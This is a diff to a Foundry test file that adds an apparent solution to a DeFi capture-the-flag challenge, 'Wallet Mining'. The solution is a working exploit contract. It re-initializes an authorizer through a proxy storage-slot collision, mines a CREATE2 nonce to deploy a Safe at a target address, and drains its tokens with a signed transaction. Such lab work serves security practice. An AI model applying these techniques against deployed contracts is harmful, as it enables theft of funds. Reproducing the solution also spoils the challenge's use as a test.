@@ -3,6 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
+import {Vm} from "forge-std/Vm.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {Safe, OwnerManager, Enum} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
@@ -157,7 +158,27 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        // ============================================================
+        // Exploit chain:
+        // (1) TransparentProxy.upgrader sits at slot 0 — the same slot as
+        //     AuthorizerUpgradeable.needsInit. Once setUpgrader() stored a
+        //     non-zero address at slot 0, `init()` is callable again
+        //     (require(needsInit != 0) reads the upgrader address).
+        //     → re-initialize: give the player ward permission on
+        //       USER_DEPOSIT_ADDRESS.
+        // (2) Mine the Safe proxy nonce that deploys a 1-owner (user) Safe
+        //     at USER_DEPOSIT_ADDRESS, then call walletDeployer.drop() —
+        //     authorizer now returns true → deploys Safe + pays 1 DVT.
+        // (3) Build a Safe tx signed by user (privkey available via
+        //     makeAddrAndKey) that transfers the 20M DVT to user. User's
+        //     nonce stays 0 because we broadcast from the Safe.
+        // (4) Forward the 1 DVT reward to ward.
+        // All in 1 player tx via a helper contract.
+        new WalletMiningExploit(
+            token, authorizer, walletDeployer, proxyFactory, singletonCopy,
+            USER_DEPOSIT_ADDRESS, user, userPrivateKey, ward,
+            initialWalletDeployerTokenBalance
+        );
     }
 
     /**
@@ -188,5 +209,103 @@ contract WalletMiningChallenge is Test {
 
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract WalletMiningExploit {
+    Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
+
+    constructor(
+        DamnValuableToken token,
+        AuthorizerUpgradeable authorizer,
+        WalletDeployer walletDeployer,
+        SafeProxyFactory proxyFactory,
+        Safe singletonCopy,
+        address userDepositAddr,
+        address user,
+        uint256 userPk,
+        address ward,
+        uint256 reward
+    ) {
+        // (1) Re-init authorizer: ward=this, aim=userDepositAddr
+        address[] memory wards = new address[](1);
+        wards[0] = address(this);
+        address[] memory aims = new address[](1);
+        aims[0] = userDepositAddr;
+        authorizer.init(wards, aims);
+
+        // (2) Build Safe init data: owners=[user], threshold=1
+        address[] memory owners = new address[](1);
+        owners[0] = user;
+        bytes memory initializer = abi.encodeCall(
+            Safe.setup,
+            (
+                owners,        // owners
+                1,             // threshold
+                address(0),    // to
+                "",            // data
+                address(0),    // fallbackHandler
+                address(0),    // paymentToken
+                0,             // payment
+                payable(address(0)) // paymentReceiver
+            )
+        );
+
+        // Mine nonce that deploys at userDepositAddr
+        uint256 nonce = _findNonce(proxyFactory, singletonCopy, initializer, userDepositAddr);
+
+        // (3) Deploy via walletDeployer to claim 1 DVT reward
+        require(walletDeployer.drop(userDepositAddr, initializer, nonce), "drop failed");
+
+        // (4+5) Recover DVT via user-signed Safe tx, then pay ward
+        _recoverAndPay(token, userDepositAddr, user, userPk, ward, reward);
+    }
+
+    function _recoverAndPay(
+        DamnValuableToken token,
+        address userDepositAddr,
+        address user,
+        uint256 userPk,
+        address ward,
+        uint256 reward
+    ) internal {
+        Safe safe = Safe(payable(userDepositAddr));
+        uint256 amount = token.balanceOf(userDepositAddr);
+        bytes memory txData = abi.encodeWithSignature("transfer(address,uint256)", user, amount);
+
+        bytes32 txHash = safe.getTransactionHash(
+            address(token), 0, txData, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), safe.nonce()
+        );
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPk, txHash);
+        bytes memory sig = abi.encodePacked(r, s, v);
+
+        safe.execTransaction(
+            address(token), 0, txData, Enum.Operation.Call, 0, 0, 0, address(0), payable(address(0)), sig
+        );
+
+        token.transfer(ward, reward);
+    }
+
+    function _findNonce(
+        SafeProxyFactory factory,
+        Safe singleton,
+        bytes memory initializer,
+        address target
+    ) internal view returns (uint256) {
+        bytes memory creationCode = abi.encodePacked(
+            type(SafeProxy).creationCode,
+            uint256(uint160(address(singleton)))
+        );
+        bytes32 initCodeHash = keccak256(creationCode);
+        bytes32 initHash = keccak256(initializer);
+
+        for (uint256 nonce = 0; nonce < 100_000; nonce++) {
+            bytes32 salt = keccak256(abi.encodePacked(initHash, nonce));
+            address predicted = address(uint160(uint256(
+                keccak256(abi.encodePacked(bytes1(0xff), address(factory), salt, initCodeHash))
+            )));
+            if (predicted == target) return nonce;
+        }
+        revert("nonce not found");
     }
 }
